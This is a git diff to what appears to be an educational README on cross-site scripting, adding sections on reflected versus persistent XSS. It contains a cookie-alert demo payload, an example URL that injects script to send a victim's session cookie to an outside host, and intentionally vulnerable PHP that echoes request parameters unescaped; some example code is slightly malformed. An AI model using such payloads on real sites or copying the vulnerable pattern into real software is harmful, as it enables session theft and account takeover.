@@ -20,9 +20,24 @@ through: phishing link
 For: user's infos (cookies)
 
 ```
-<br><br><br><br><br><br><br>
 
-<h1 align="center">🌐 Demonstration 🌐</h1>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Demonstration 🌐</h1>
 <p>Suppose you have web application that obtains a user name and reflects it back to a web page. Suppose that instead of just entering your name 
   "Imène", the input was:</p>
 
@@ -35,12 +50,28 @@ Imène<script>alert(document.cookie)</script>
 • To perpetrate an exploit, the attacker will try to get others to come to this page (maybe with phishing attacks)</p>
 <p>• The attack could have been avoided by doing the following:<br>
 – Removing the script upon input<br>
-– Neutralizing the script when the HTML is output</p><br><br><br><br><br><br><br>
+– Neutralizing the script when the HTML is output</p>
 
 
 
 
-<h1 align="center">🌐 Get into The Attack 🌐</h1>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Get into The Attack 🌐</h1>
 
 <p>A Cross-Site Scripting (XSS) exploit is an attack on the user,not the site. But liability means that the site is responsible <br>
   • If the XSS string is input and then reflected back to the user,it is called <b>Reflected XSS</b>.For example, a URL that leads a victim to a site that will 
@@ -68,7 +99,24 @@ Imène<script>alert(document.cookie)</script>
 • Launching further attacks against others<br>
 • Accessing the local file system</p>
 
-<br><p>• To perpetrate an XSS attack an attacker can use:</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 XSS Types 🌐</h1>
+<br><p>•XSS vulnerabilities fall into two categories, To perpetrate an XSS attack an attacker can use:</p>
 <table>
   <tr>
     <td><b> A persistent attack</b></td>
@@ -76,9 +124,76 @@ Imène<script>alert(document.cookie)</script>
   </tr>
   
   <tr>
-    <td><b>A non-persistent attack</b></td>
+    <td><b>A non-persistent attack (Reflected XSS) </b></td>
     <td colspan='10'>where the attack vector is inserted into the data stream but not stored</td>
   </tr>
 </table>
+
+
+<p>Based primarily on whether they are one-off attacks or can be used repeatedly.</p>
+<br><br><h3>Reflected XSS</h3>
+<p>
+–Parameters from a request are used improperly, resulting in a script running and harvesting data from the submitter.<br>
+–The attacker buries malicious queries in a page using links, I-frames, …
+</p>
+
+<br><br><h3>A non-persistent example</h3>
+<p>
+– Fred notices that bbq.com has a reflected XSS vulnerability and creates a URL that exploits it.<br>
+– Fred sends an email to Ted enticing Ted to click on it.<br>
+– Ted does so.<br>
+– The bbq.com sends Ted’s client a page that contains a script that executes and sends Ted’s session cookie to Fred’s site.<br>
+– Fred can now access bbq.com as Ted (at least for a while).</p>
+
+```html
+http://bbq.com?prod=grill&name=<script>http://asite.com?sid=document.cookie()</script>
+```
+The server code, does something like this.
+```python
+print ("Thanks for your interest in %s",name);
+```
+
+```html
+<?setcookie ("xss1", "42");?>
+<HTML>
+  <BODY>
+    <h3>Welcome to The BBQ</H3>
+    <BR>
+    <?
+      $prod=$_GET['prod'];
+      $name=$_GET['name'];
+      print ("We appreciate your interest in our $name grills<BR>");
+      print ("What can we help you with today<BR>");
+    ?>
+  </BODY>
+</HTML>
+  ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br><br><br><br><br><br><br><br><br><h1 align="center">🌐 Hackers objectives through XSS 🌐</h1>
+<br><p>The objective is to insert JavaScript into a data stream so that it executes in the users browser.The client system is open to attack, but so is any site with open valid sessions in the client.</p>
+<p>• The executable code can:<br>
+–Redirect to another site.<br>
+–Execute something that attacks the victim’s system.<br>
+–Execute something that collects data from the victim.<br>
+–Modify the browser representation to lead the user to undesirable sites.</p>
+<p>• The typical outcomes are: <br>
+–Private data harvesting.<br>
+–Session data interception.<br>
+–Site vandalism.<br>
   
  
